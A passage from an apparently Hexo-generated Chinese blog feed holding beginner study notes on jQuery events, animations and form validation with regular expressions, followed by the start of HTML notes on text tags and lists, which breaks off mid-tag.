class="line">});</span><br></pre></td></tr></tbody></table></figure><p>在这个例子中，我们使用<code>keydown</code>事件来监听整个文档上的键盘按下事件。当按下任意键时，会触发函数内的代码。在函数中，我们获取按下的键码，并检查是否是Enter键（键码为13）。如果是Enter键，就弹出一个提示框。</p><p>这只是一个简单的例子，你可以根据需要使用其他键码或结合其他事件来编写更复杂的键盘事件处理逻辑。JQuery的键盘事件提供了很多灵活的选项，可以帮助你创建交互性强的网页应用程序。</p><h4 id="3-绑定事件和移除事件"><a href="#3-绑定事件和移除事件" class="headerlink" title="3.绑定事件和移除事件"></a>3.绑定事件和移除事件</h4><p>JQuery是一个广泛应用于网页开发中的JavaScript库，它提供了许多简化DOM操作和处理事件的方法。绑定事件和移除事件是JQuery中常用的方法之一，可以用于在特定条件下执行相应的JavaScript代码。</p><h5 id="绑定事件"><a href="#绑定事件" class="headerlink" title="绑定事件"></a>绑定事件</h5><p>绑定事件是指将一个特定的JavaScript函数与一个HTML元素的事件关联起来。当该事件被触发时，绑定的函数将被执行。JQuery通过<code>on()</code>方法来实现事件绑定。</p><p>语法：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(selector).<span class="title function_">on</span>(event, <span class="keyword">function</span>)</span><br></pre></td></tr></tbody></table></figure><ul><li><code>selector</code>表示要绑定事件的元素。可以是任何有效的CSS选择器，例如元素名、类名或ID。</li><li><code>event</code>表示要绑定的事件的名称，例如<code>click</code>、<code>mouseover</code>等。</li><li><code>function</code>是一个回调函数，当事件被触发时将执行其中的代码。</li></ul><p>示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 绑定一个按钮的点击事件</span></span><br><span class="line">$(<span class="string">'#myButton'</span>).<span class="title function_">on</span>(<span class="string">'click'</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">'按钮被点击了！'</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定多个元素的同一事件</span></span><br><span class="line">$(<span class="string">'.myClass'</span>).<span class="title function_">on</span>(<span class="string">'mouseover'</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">  $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">'background-color'</span>, <span class="string">'yellow'</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h5 id="移除事件"><a href="#移除事件" class="headerlink" title="移除事件"></a>移除事件</h5><p>移除事件是指取消之前绑定的事件。JQuery提供了<code>off()</code>方法来移除已经绑定的事件。</p><p>语法：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(selector).<span class="title function_">off</span>(event)</span><br></pre></td></tr></tbody></table></figure><ul><li><code>selector</code>表示要移除事件的元素，与绑定事件时的选择器相同。</li><li><code>event</code>表示要移除的事件的名称。</li></ul><p>示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 移除一个按钮的点击事件</span></span><br><span class="line">$(<span class="string">'#myButton'</span>).<span class="title function_">off</span>(<span class="string">'click'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除所有元素的同一事件</span></span><br><span class="line">$(<span class="string">'.myClass'</span>).<span class="title function_">off</span>(<span class="string">'mouseover'</span>);</span><br></pre></td></tr></tbody></table></figure><p>通过绑定事件和移除事件，你可以方便地在网页中管理各种交互行为，并根据需要动态地添加或移除事件处理程序。这些方法在JQuery中非常常用且易于理解，适合新手入门。</p><h4 id="4-复合事件"><a href="#4-复合事件" class="headerlink" title="4.复合事件"></a>4.复合事件</h4><p>JQuery复合事件是指将多个事件绑定到同一个元素上，以便在特定的条件下执行多个操作。通过复合事件，可以简化代码并提高交互性。下面是一个例子来说明如何使用JQuery复合事件。</p><p>假设我们有一个按钮，当用户点击按钮时，会触发一个事件，同时按住Shift键并点击按钮时，会触发另一个事件。我们可以使用JQuery的<code>on()</code>方法来绑定这两个事件，并使用<code>shiftKey</code>属性来检查Shift键是否按下。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="comment">// 获取按钮元素</span></span><br><span class="line">  <span class="keyword">var</span> button = $(<span class="string">"#myButton"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 绑定点击事件</span></span><br><span class="line">  button.<span class="title function_">on</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">"点击事件被触发！"</span>);</span><br><span class="line">  });</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 绑定复合事件</span></span><br><span class="line">  button.<span class="title function_">on</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params">event</span>) {</span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">shiftKey</span>) {</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">"Shift键 + 点击事件被触发！"</span>);</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>在这个例子中，我们先使用<code>on()</code>方法将点击事件绑定到按钮上。然后，我们再次使用<code>on()</code>方法来绑定一个复合事件。当用户点击按钮时，第一个事件会触发并弹出一个提示框。当用户按住Shift键并点击按钮时，第二个事件会触发并弹出另一个提示框。</p><p>通过使用复合事件，我们可以根据不同的条件执行不同的操作，从而增强用户体验。这个例子展示了如何在按钮上实现不同事件的触发，但你可以根据自己的需求来定义和绑定复合事件。</p><h4 id="5-常用动画方法"><a href="#5-常用动画方法" class="headerlink" title="5.常用动画方法"></a>5.常用动画方法</h4><p>JQuery是一个流行的JavaScript库，提供了许多强大的动画方法，用于创建交互性丰富的网页。下面是一些常用的JQuery动画方法以及它们的示例。</p><ol><li><code>hide()</code>和<code>show()</code>: 这些方法用于隐藏和显示元素。可以通过设置参数来指定动画的速度和完成后的回调函数。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(element).<span class="title function_">hide</span>(<span class="number">1000</span>); <span class="comment">// 将元素以1秒的速度隐藏</span></span><br><span class="line">$(element).<span class="title function_">show</span>(<span class="number">2000</span>); <span class="comment">// 将元素以2秒的速度显示</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li><code>fadeIn()</code>和<code>fadeOut()</code>: 这些方法通过渐变效果淡入和淡出元素。可以通过设置参数指定动画的速度和完成后的回调函数。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(element).<span class="title function_">fadeIn</span>(<span class="number">1000</span>); <span class="comment">// 以1秒的速度淡入元素</span></span><br><span class="line">$(element).<span class="title function_">fadeOut</span>(<span class="number">2000</span>); <span class="comment">// 以2秒的速度淡出元素</span></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li><code>slideUp()</code>和<code>slideDown()</code>: 这些方法通过滑动效果向上或向下折叠元素。可以通过设置参数指定动画的速度和完成后的回调函数。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(element).<span class="title function_">slideUp</span>(<span class="number">1000</span>); <span class="comment">// 以1秒的速度向上折叠元素</span></span><br><span class="line">$(element).<span class="title function_">slideDown</span>(<span class="number">2000</span>); <span class="comment">// 以2秒的速度向下展开元素</span></span><br></pre></td></tr></tbody></table></figure><ol start="4"><li><code>animate()</code>: 这个方法可以通过指定CSS属性的变化来创建自定义动画。可以设置动画的持续时间、缓动效果和完成后的回调函数。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(element).<span class="title function_">animate</span>({ </span><br><span class="line">  <span class="attr">opacity</span>: <span class="number">0.5</span>, <span class="comment">// 将元素透明度设置为0.5</span></span><br><span class="line">  <span class="attr">left</span>: <span class="string">'+=100px'</span> <span class="comment">// 向右移动100像素</span></span><br><span class="line">}, <span class="number">1000</span>); <span class="comment">// 在1秒内完成动画</span></span><br></pre></td></tr></tbody></table></figure><ol start="5"><li><code>toggleClass()</code>: 这个方法可以切换元素的类。通过设置参数来指定动画的速度和完成后的回调函数。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(element).<span class="title function_">toggleClass</span>(<span class="string">'active'</span>, <span class="number">1000</span>); <span class="comment">// 在1秒内切换元素的active类</span></span><br></pre></td></tr></tbody></table></figure><p>这些是JQuery中常用的动画方法，可以根据需要选择适合的方法来创建各种交互效果。在示例中，可以根据具体情况自定义元素和动画效果。</p><h4 id="6-自义定动画方法"><a href="#6-自义定动画方法" class="headerlink" title="6.自义定动画方法"></a>6.自义定动画方法</h4><p>JQuery是一个广泛使用的JavaScript库，它提供了许多内置的动画函数和效果，可以方便地创建各种动画效果。除了内置的动画函数外，JQuery还允许开发者自定义动画方法。</p><p>自定义动画方法允许您定义并使用自己的动画效果，将其与JQuery的其他功能结合使用。下面是一个简单的自定义动画方法的介绍和示例：</p><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>自定义动画方法是通过JQuery的<code>$.fn.extend()</code>函数来实现的。该函数允许我们向JQuery对象的原型（prototype）添加新的方法。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$.fn.<span class="title function_">extend</span>({</span><br><span class="line">  <span class="attr">customAnimation</span>: <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="comment">// 在这里编写自定义动画的代码</span></span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>在上面的代码中，我们使用<code>customAnimation</code>作为自定义动画方法的名称。使用<code>$.fn.extend()</code>函数可以向JQuery对象的原型添加任意数量的自定义方法。</p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>下面是一个简单的自定义动画方法的示例，它将元素平滑地从左到右移动：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$.fn.<span class="title function_">extend</span>({</span><br><span class="line">  <span class="attr">slideRight</span>: <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">      $(<span class="variable language_">this</span>).<span class="title function_">animate</span>({</span><br><span class="line">        <span class="attr">marginLeft</span>: <span class="string">"+=200px"</span></span><br><span class="line">      }, <span class="number">1000</span>);</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>在上面的代码中，我们定义了一个名为<code>slideRight</code>的自定义动画方法。该方法使用<code>animate()</code>函数来实现动画效果。在这个例子中，我们将元素的<code>marginLeft</code>属性增加200像素，动画的持续时间为1秒。</p><p>要使用该自定义动画方法，您只需将其应用到一个JQuery对象上，就像使用内置的动画方法一样：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"div"</span>).<span class="title function_">slideRight</span>();</span><br></pre></td></tr></tbody></table></figure><p>上述代码将应用<code>slideRight</code>动画效果到所有的<code>&lt;div&gt;</code>元素上。</p><p>自定义动画方法可以根据需求进行扩展，您可以使用JQuery的其他动画函数、属性或回调函数来创建更复杂的动画效果。</p><p>希望这个简单的例子能帮助您更好地理解JQuery自定义动画方法。您可以根据自己的需求扩展和修改这些方法，以满足您的动画效果要求。</p><h3 id="6-表单校验"><a href="#6-表单校验" class="headerlink" title="6.表单校验"></a>6.表单校验</h3><h4 id="1-表单选择器"><a href="#1-表单选择器" class="headerlink" title="1.表单选择器"></a>1.表单选择器</h4><table><thead><tr><th><strong>语法</strong></th><th><strong>描述</strong></th><th><strong>返回值</strong></th></tr></thead><tbody><tr><td><strong>:input</strong></td><td><strong>匹配所有input，textarea，select和button元素</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:text</strong></td><td><strong>匹配所有的单行文本框</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:password</strong></td><td><strong>匹配所有密码框</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:radio</strong></td><td><strong>匹配所有单选按钮</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:checkbox</strong></td><td><strong>匹配所有复选框</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:submit</strong></td><td><strong>匹配所有提交按钮</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:reset</strong></td><td><strong>匹配许所有重置按钮</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:button</strong></td><td><strong>匹配所有按钮</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:image</strong></td><td><strong>匹配所有文件域</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:file</strong></td><td><strong>匹配所有文件域</strong></td><td><strong>元素集合</strong></td></tr></tbody></table><p>过滤选择器</p><table><thead><tr><th><strong>语法</strong></th><th><strong>描述</strong></th><th><strong>返回值</strong></th></tr></thead><tbody><tr><td><strong>:enabled</strong></td><td><strong>匹配所有可用元素</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:disabled</strong></td><td><strong>匹配所有不可元素</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:checked</strong></td><td><strong>匹配所有被选中元素(复选框，单选按钮，下拉列表)</strong></td><td><strong>元素集合</strong></td></tr><tr><td><strong>:selected</strong></td><td><strong>匹配select所选中的option元素</strong></td><td><strong>元素集合</strong></td></tr></tbody></table><h4 id="2-表单校验"><a href="#2-表单校验" class="headerlink" title="2.表单校验"></a>2.表单校验</h4><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> password = $(<span class="string">"#password"</span>).<span class="title function_">val</span>();</span><br><span class="line">           <span class="keyword">let</span> email = $(<span class="string">"#email"</span>).<span class="title function_">val</span>();</span><br><span class="line">           <span class="keyword">let</span> <span class="title class_">Se</span> = $(<span class="string">"#Semail"</span>);</span><br><span class="line">           <span class="keyword">let</span> <span class="title class_">Sp</span> = $(<span class="string">"#Spassword"</span>);</span><br><span class="line">           <span class="comment">// if (email == '' || email == null){</span></span><br><span class="line">           <span class="comment">//     alert("邮箱不能为空");</span></span><br><span class="line">           <span class="comment">//     Sp.html("邮箱不能为空");</span></span><br><span class="line">           <span class="comment">//     return false;</span></span><br><span class="line">           <span class="comment">// }</span></span><br><span class="line">           <span class="comment">// if (email.indexOf(".") == -1){</span></span><br><span class="line">           <span class="comment">//     alert("邮箱格式不正确");</span></span><br><span class="line">           <span class="comment">//     return false;</span></span><br><span class="line">           <span class="comment">// }</span></span><br><span class="line">           <span class="comment">// if (email.indexOf("@") == -1){</span></span><br><span class="line">           <span class="comment">//     alert("邮箱格式不正确");</span></span><br><span class="line">           <span class="comment">//     return false;</span></span><br><span class="line">           <span class="comment">// }</span></span><br><span class="line">           <span class="comment">// if (email.indexOf("@") == 0){</span></span><br><span class="line">           <span class="comment">//     alert("邮箱不能以@为开头");</span></span><br><span class="line">           <span class="comment">//     return false;</span></span><br><span class="line">           <span class="comment">// }</span></span><br><span class="line">           <span class="comment">// if (password == '' || password == null){</span></span><br><span class="line">           <span class="comment">//     alert("密码不能为空");</span></span><br><span class="line">           <span class="comment">//     return false;</span></span><br><span class="line">           <span class="comment">// }</span></span><br><span class="line">           <span class="comment">// if (password.length &lt; 8){</span></span><br><span class="line">           <span class="comment">//     alert("密码不能小于八位");</span></span><br><span class="line">           <span class="comment">//     return false;</span></span><br><span class="line">           <span class="comment">// }</span></span><br><span class="line">       })</span><br></pre></td></tr></tbody></table></figure><h4 id="3-正则表达式"><a href="#3-正则表达式" class="headerlink" title="3.正则表达式"></a>3.正则表达式</h4><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"#form"</span>).<span class="title function_">submit</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">          <span class="keyword">let</span> password = $(<span class="string">"#password"</span>).<span class="title function_">val</span>();</span><br><span class="line">          <span class="keyword">let</span> email = $(<span class="string">"#email"</span>).<span class="title function_">val</span>();</span><br><span class="line">          <span class="keyword">let</span> <span class="title class_">Se</span> = $(<span class="string">"#Semail"</span>);</span><br><span class="line">          <span class="keyword">let</span> <span class="title class_">Sp</span> = $(<span class="string">"#Spassword"</span>);</span><br><span class="line">          <span class="keyword">let</span> emailExp = <span class="regexp">/^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$/</span>;</span><br><span class="line">          <span class="keyword">if</span> (emailExp.<span class="title function_">test</span>(email) == <span class="literal">false</span>){</span><br><span class="line">                   <span class="title class_">Se</span>.<span class="title function_">html</span>(<span class="string">"邮箱错误"</span>);</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">let</span> passwordExp = <span class="regexp">/^[0-9]{6,18}$/</span>;</span><br><span class="line">          <span class="keyword">if</span> (passwordExp.<span class="title function_">test</span>(password) == <span class="literal">false</span>){</span><br><span class="line">              <span class="title class_">Sp</span>.<span class="title function_">html</span>(<span class="string">"密码错误"</span>);</span><br><span class="line">          }</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">"登录成功"</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      })</span><br><span class="line"></span><br><span class="line">  })</span><br></pre></td></tr></tbody></table></figure><table><thead><tr><th><strong>元字符</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>/…/</strong></td><td><strong>代表一个模式的开始和结束</strong></td></tr><tr><td><strong>^</strong></td><td><strong>匹配字符串开始的位置</strong></td></tr><tr><td><strong>$</strong></td><td><strong>匹配字符串结束的位置</strong></td></tr><tr><td><strong>\s</strong></td><td><strong>任何空白字符</strong></td></tr><tr><td><strong>\S</strong></td><td><strong>任何非空白字符</strong></td></tr><tr><td><strong>\d</strong></td><td><strong>匹配一个数字字符，等价于[0-9]</strong></td></tr><tr><td><strong>\D</strong></td><td><strong>除了数字之外的任何字符，等价于*[^0-9]</strong></td></tr><tr><td><strong>\w</strong></td><td><strong>匹配一个数字、下划线或字母字符，等价于*<em>*</em>[A-Za-z0-9_]</strong></td></tr><tr><td><strong>\W</strong></td><td><strong>任何非单字字符，等价于*[^a-zA-z0-9_]</strong></td></tr><tr><td><strong>.</strong></td><td><strong>除了换行符之外的任意字符</strong></td></tr><tr><td><strong>{n}</strong></td><td><strong>匹配前一项n次</strong></td></tr><tr><td><strong>{n,}</strong></td><td><strong>匹配前一项n次，或者多次</strong></td></tr><tr><td><strong>{n,m}</strong></td><td><strong>匹配前一项至少n次，但是不能超过m次。其中n和m均为非负整数，n&lt;=m</strong></td></tr><tr><td>*****</td><td><strong>匹配前一项0次或多次，等价于{0,}</strong></td></tr><tr><td><strong>+</strong></td><td><strong>匹配前一项1次或多次，等价于{1,}</strong></td></tr><tr><td><strong>？</strong></td><td><strong>匹配前一项0次或1次，也就是说前一项是可选的，等价于{0,1}</strong></td></tr><tr><td><strong>[]</strong></td><td><strong>定义匹配的字符串</strong></td></tr><tr><td><strong>()</strong></td><td><strong>用于提取匹配的字符串，表达式中有几个()就有几个相应匹配字符串</strong></td></tr><tr><td><strong>{}</strong></td><td><strong>用于匹配长度</strong></td></tr><tr><td><strong>|</strong></td><td><strong>或者</strong></td></tr></tbody></table><p>  <strong>RegExp对象的方法</strong></p><table><thead><tr><th><strong>方法</strong></th><th align="center"><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>test(String)</strong></td><td align="center"><strong>用于检索一个字符串是否匹配某个模式。如果在字符串含有匹配的文本，则返回true；否则返回false</strong></td></tr><tr><td><strong>exec(String)</strong></td><td align="center"><strong>用于检索一个字符串是否匹配某个模式。如果在字符串含有匹配的文本，则返回匹配的结果；否则返回null</strong></td></tr></tbody></table><p> <strong>String对象的方法</strong></p><table><thead><tr><th align="center"><strong>方法</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td align="center"><strong>match(RegExp)</strong></td><td><strong>检索字符串中一个或多个正则表达式匹配的值，返回一个存放匹配结果的数组</strong></td></tr><tr><td align="center"><strong>search(RegExp)</strong></td><td><strong>检索字符串中第一个与正则表达式相匹配的字符串的起始位置</strong></td></tr><tr><td align="center"><strong>replace(RegExp/String,replacement)</strong></td><td><strong>替换与正则表达式匹配的字符串</strong></td></tr><tr><td align="center"><strong>split(separator,n)</strong></td><td><strong>以separator为边界，将字符串分割为字符串数组，n为限制输出数组的个数</strong></td></tr></tbody></table><h4 id="4-HTML5表单新增属性"><a href="#4-HTML5表单新增属性" class="headerlink" title="4.HTML5表单新增属性"></a>4.HTML5表单新增属性</h4><table><thead><tr><th><strong>属性</strong></th><th align="center"><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>placeholder</strong></td><td align="center"><strong>提供一种提示(hint),也就是输入框里的默认值，点击后会自动消失</strong></td></tr><tr><td><strong>required</strong></td><td align="center"><strong>规定输入域不能为空</strong></td></tr><tr><td><strong>pattern</strong></td><td align="center"><strong>规定用于验证输入域的正则表达式</strong></td></tr></tbody></table><h4 id="5-validity属性应用"><a href="#5-validity属性应用" class="headerlink" title="5.validity属性应用"></a>5.validity属性应用</h4><p><strong>当表单元素添加验证属性required和pattern后，可以通过HTML5提供的validityState对象获取当前验证属性的验证状态</strong></p><p>​    <strong>语法：</strong></p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> validityState=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"user"</span>).<span class="property">validity</span></span><br></pre></td></tr></tbody></table></figure><p>​                                        <strong>validityState对象属性</strong></p><table><thead><tr><th><strong>属性</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>valueMissing</strong></td><td><strong>当表单元素设置required属性后，如果表单的值为空，则无法通过表单验证，****返回true；否则，返回false</strong></td></tr><tr><td><strong>typeMismatch</strong></td><td><strong>当用户输入的内容与表单类型不匹配时，返回true；否则，返回false</strong></td></tr><tr><td><strong>patternMismatch</strong></td><td><strong>当用户输入的内容与表单元素patterm特性的正则不匹配时，****返回true;否则，返回false</strong></td></tr><tr><td><strong>tooLong</strong></td><td><strong>当用户输入的内容超过了表单元素maxLength特性限定的字符长度时，****返回true;否则，返回false</strong></td></tr><tr><td><strong>rangeUnderflow</strong></td><td><strong>当用户输入的值小于min特性的值时，返回true；否则，返回false</strong></td></tr><tr><td><strong>rangeOverflow</strong></td><td><strong>当用户输入的值大于max特性的值时，返回true; 否则，返回false</strong></td></tr><tr><td><strong>stepMismatch</strong></td><td><strong>当用户输入的值不符合step特性所推算的规则时，返回true; 否则，返回false</strong></td></tr><tr><td><strong>customError</strong></td><td><strong>使用自定义的验证错误提示信息时，当存在自定义错误信息时，****返回true: 否则，返回false</strong></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> JQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html学习笔记</title>
      <link href="/NANABLOG/2023/12/11/html/"/>
      <url>/NANABLOG/2023/12/11/html/</url>
      
        <content type="html"><![CDATA[<h2 id="一些文本标签"><a href="#一些文本标签" class="headerlink" title="一些文本标签"></a>一些文本标签</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>世界杯<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">今天的世界杯可以赌赌球<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">彩票<span class="tag">&lt;<span class="name">strong</span>&gt;</span>反着买<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>，别墅靠<span class="tag">&lt;<span class="name">em</span>&gt;</span>大海<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>日<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>本<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>小日本踢的还不错<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>中国男足一点也不争气！气死个人！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>德<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>国<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>大于号<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>小于号<span class="symbol">&amp;lt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">"男足<span class="symbol">&amp;quot;</span><span class="symbol">&amp;quot;</span>实力"<span class="symbol">&amp;lt;</span>女足<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">女足<span class="symbol">&amp;quot;</span>实力远远<span class="symbol">&amp;gt;</span>男足<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">版权符号<span class="symbol">&amp;copy;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>北大青鸟<span class="symbol">&amp;copy;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>无序列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>歌单<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>光辉岁月<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>倔强<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>江南<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--有序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>歌单<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>光辉岁月<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>倔强<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>江南<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--自定义列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>蔬菜<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>西红柿<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>大白菜<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>包菜<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>水果<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>菠萝<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>橘子<span class="tag">&lt;/<span 